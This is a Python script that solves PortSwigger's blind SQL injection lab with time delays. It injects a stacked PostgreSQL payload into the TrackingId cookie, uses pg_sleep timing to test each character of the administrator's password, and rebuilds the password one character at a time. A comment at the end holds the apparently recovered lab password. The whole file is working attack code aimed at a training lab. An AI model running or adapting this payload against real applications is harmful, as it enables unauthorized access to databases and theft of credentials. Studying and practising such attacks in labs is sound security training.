import requests
import argparse

# Blind SQLi with conditional time delays:
# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

parser = argparse.ArgumentParser(description="Automate PortSwigger's 'Blind SQLi with time delays' challenge. e.g. python3 blind-sqli-delay.py -u https://ace01f221e2b5a5f803c80580022002f.web-security-academy.net/ -t dOgxWeuy9yyZBE2w")
parser.add_argument("-u", "--url", help="Your PortSwigger lab URL")
parser.add_argument("-t", "--trackingID", help="Your tracking ID cookie value e.g. jJAX7Coxb9gbyFMq")
args = parser.parse_args()

print(f"URL = {args.url}")
print(f"Tracking ID = {args.trackingID}")

s = requests.Session()

# Basic request format
url = args.url
cookies = {"TrackingId": args.trackingID}
response = s.get(url,cookies=cookies)

# Temp pw length to skip above
password_length = 25

valid_chars = []
for pos in range(1,password_length):
    password_guesses = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k','l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

    for guess in password_guesses:
        sql_payload = f"'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{pos},1)='{guess}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users --"
        cookies = {"TrackingId": f"{args.trackingID}{sql_payload}"}
        response = s.get(url,cookies=cookies)
        time_taken = response.elapsed.total_seconds()

        # print(f"Trying payload {sql_payload}")
      
        # print(f"Time taken: {time_taken}")

        
        if time_taken > 5:
            print(f"Successful payload; {sql_payload}")
            valid_chars.append(guess)
            print(f"Password: " + ''.join(valid_chars) + "...")

print(f"Password ultimately is: " + ''.join(valid_chars))
#5etefqmgoqxh4ob9wrf92